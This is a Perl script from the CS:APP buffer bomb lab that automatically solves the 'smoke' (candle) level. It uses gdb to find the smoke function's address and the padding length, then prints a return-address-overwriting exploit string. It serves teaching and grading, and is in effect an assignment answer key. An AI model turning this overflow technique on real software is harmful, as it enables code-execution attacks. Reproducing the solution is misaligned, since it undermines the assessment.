#!/usr/bin/perl 
#!/usr/local/bin/perl

use Getopt::Std;
use lib "../grade";
use config;

#######################################################################
# smoke.pl - automatically solves buffer bomb for candle level
#
# Copyright (c) 2002, R. Bryant and D. O'Hallaron, All rights reserved.
# May not be used, modified, or copied without permission.
#
#######################################################################

$| = 1; # autoflush output on every print statement

#
# usage - print help message and terminate
#
sub usage 
{
    printf STDERR "$_[0]\n";
    printf STDERR "Usage: $0 [-h] -t <teamname>\n";
    printf STDERR "  -t <teamname> Team name\n";
    printf STDERR "Options:\n";
    printf STDERR "  -h            Print this message\n";
    die "\n";
}

$flags = "";

getopts('hst:');
if ($opt_h) {
    usage();
}

if (!$opt_t) {
    usage("Missing team name (-t)\n");
}

if ($opt_s) {
    $flags = "-s";
}

$team = $opt_t;


# Run gdb to extract runtime information
$gdbfile = "smoke.gdb";
open(GDB, ">$gdbfile") || die "Can't open GDB file $gdbfile\n";

# The gdb script runs the program far enough into getbuf that register
# %eax holds the value of buf.
# It then extracts:
#   $smoke: The address of the smoke function
#   $padcount: The amount of padding to insert to make the buffer overflow
#   and overwrite the return pointer

print GDB <<GDBSTUFF;
break getbuf
run -t $team
stepi 4
print /x (int) smoke
print /d (\$ebp-\$eax+4)
quit
GDBSTUFF

close GDB;

$gdbout = `gdb -nw $EXECUTABLE -x $gdbfile | grep \"=\"`
    || die "Couldn't run gdb with batch file $gdbfile\n";

$gdbout =~ s/\$[0-9]* = //g;
($smoke, $padcount) = split(/\n/, $gdbout);

for ($i = 0; $i < $padcount; $i++) {
    print "00 ";
}

$a = hex($smoke);

printf("%.2x %.2x %.2x %.2x\n", $a&0xFF, ($a>>8)&0xFF, ($a>>16)&0xFF, ($a>>24) & 0xFF);

